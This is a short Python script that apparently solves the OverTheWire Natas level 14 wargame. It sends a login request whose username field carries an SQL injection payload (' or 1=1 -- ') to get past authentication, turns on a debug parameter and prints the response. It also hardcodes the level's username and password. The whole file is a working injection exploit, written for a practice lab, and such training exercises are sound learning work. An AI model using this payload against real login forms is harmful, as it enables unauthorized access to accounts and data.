import requests         #type: ignore 

url="http://natas14.natas.labs.overthewire.org"
auth=("natas14","z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ")
data={
    "username":"name",
    "password":"password"
}
params={
    "debug":1
}

data["username"]='elysian" or 1=1 -- '


r=requests.post(url,data=data,auth=auth,params=params)
print(r.text)